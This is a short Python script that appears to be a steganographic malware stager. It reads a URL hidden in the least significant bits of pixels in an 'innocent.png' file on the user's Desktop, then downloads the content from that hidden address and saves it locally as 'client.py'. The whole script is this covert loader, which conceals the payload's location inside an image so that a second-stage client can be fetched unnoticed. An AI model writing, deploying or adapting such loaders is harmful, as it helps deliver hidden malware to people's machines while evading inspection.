from PIL import Image
import os
import time
import requests

def execute(url):
    # TESTING
    local_filename = "client.py"  # Local file to save the downloaded content

    try:
        # Send a GET request to the URL
        response = requests.get(url, stream=True)
        
        # Check if the request was successful
        response.raise_for_status()  # Raise an error for bad responses (4xx, 5xx)

        # Open a local file for writing the downloaded content
        with open(local_filename, 'wb') as f:
            # Write the content in chunks to handle large files
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)

        print(f"File downloaded successfully and saved as '{local_filename}'")
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {e}")


save_path = os.path.join(os.path.expanduser("~"), "Desktop", "innocent.png")
image = Image.open(save_path, 'r')

data = ''
imgdata = iter(image.getdata())

while (True):
    pixels = [value for value in imgdata.__next__()[:3] +
                            imgdata.__next__()[:3] +
                            imgdata.__next__()[:3]]

    binstr = ''

    for i in pixels[:8]:
        if (i % 2 == 0):
            binstr += '0'
        else:
            binstr += '1'

    data += chr(int(binstr, 2))
    if (pixels[-1] % 2 != 0):
        execute(data)
        break